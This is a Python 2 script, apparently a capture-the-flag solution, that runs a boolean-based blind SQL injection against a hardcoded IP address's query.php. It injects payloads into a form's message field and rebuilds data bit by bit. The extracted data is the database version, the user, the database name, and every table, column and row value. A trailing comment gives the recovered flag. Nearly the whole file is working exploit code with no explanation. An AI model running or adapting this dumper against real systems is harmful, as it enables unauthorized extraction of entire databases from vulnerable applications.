#!/usr/bin/python
# coding: utf-8

import requests


"""
substr(lpad(bin(ascii(substr(char,1,1))),7,0),1,1) = 1 >> True   [1]
substr(lpad(bin(ascii(substr(char,1,1))),7,0),2,1) = 1 >> True   [1]
substr(lpad(bin(ascii(substr(char,1,1))),7,0),3,1) = 1 >> True   [1]
substr(lpad(bin(ascii(substr(char,1,1))),7,0),4,1) = 1 >> False   [0]
substr(lpad(bin(ascii(substr(char,1,1))),7,0),5,1) = 1 >> False   [0]
substr(lpad(bin(ascii(substr(char,1,1))),7,0),6,1) = 1 >> False   [0]
substr(lpad(bin(ascii(substr(char,1,1))),7,0),7,1) = 1 >> True   [1]
"""

# pre-definition
url = "http://223.194.105.184:9180/query.php"



# get string
def getCharacter(character):
	ascii2bin = ""

	for i in range(0, 8):
		data = {
			'to': 'hello',
			'message': "' || (select substr(  lpad(bin(ascii({0})),7,0)  ,{1},1) = 1) #".format(character, i)
		}
		# print data['message']
		content = requests.post(url, data=data).text

		# True
		if content.find("Hi~") > -1:
			ascii2bin += '1'
		# False
		else:
			ascii2bin += '0'

	# print ascii2bin
	return chr(int(ascii2bin, 2))



# get length of the string
def getLength(character):

	for i in range(100):
		query = "' || (select length({0}))={1}#".format(character, i)

		data = {
			'to': 'hello',
			'message': query
		}
		# print data['message']
		content = requests.post(url, data=data).content

		if content.find("Hi~") > -1:
			length = i

			return length

# get string
def getString(string):
	length = getLength(string)
	result = ""

	for i in range(1, length+1):
		result += getCharacter("(select substr({0},{1},1))".format(string, i))

	return result


# get strings in many rows
def getRowNum(table, condition="1"):
	count = "(select count(*) from {0} where {1})".format(table, condition)

	length = int(getString(count))
	print "[!] '{0}' columns rows : {1}".format(table, length)
	return length

# get columns
def getColumns(column, table, condition="1"):
	rowNum = getRowNum(table, condition)

	columns = [ ]
	for i in range(0, rowNum):
		query = "(select {0} from {1} where {2} limit {3},1)".format(column, table, condition, i)
		columnName = getString(query)

		print columnName
		columns.append(columnName)

	return columns


def getStringFromColumn(column, table, condition="1", limit="1"):

	query = "(select {0} from {1} where {2} limit {3},1)".format(column, table, condition, limit)
	print query
	string = getString(query)

	return string





if __name__ == "__main__":
	# Test start
	db_version = getString('@@version')
	print "[*] DB version : ", db_version

	# get User name
	user = getString('user()')
	print "[*] User : ", user

	# get database name
	database = getString('database()')
	print "[*] Database : ", database


	tables = getColumns('table_name', 'information_schema.tables', "table_schema='{0}'".format(database))
	print "[*] Tables : ", tables, "\n"

	for table in tables:
		print "[*] Columns of table ('{0}'): ".format(table)
		columns = getColumns('column_name', 'information_schema.columns', "table_name='{0}'".format(table))

		rowNum = getRowNum(table)
		for i in range(0, rowNum):
			limit = rowNum - i - 1
			for column in columns:
				print "\n\n[*] The values in column ('{0}') : ".format(column)
				string = getStringFromColumn(column, table, limit=str(limit))

				print string

# chopper's location is 4c4f485f485553547b50315f316e6b5f48617a6172647d
# decode it
# the flag is LOH_HUST{P1_1nk_Hazard}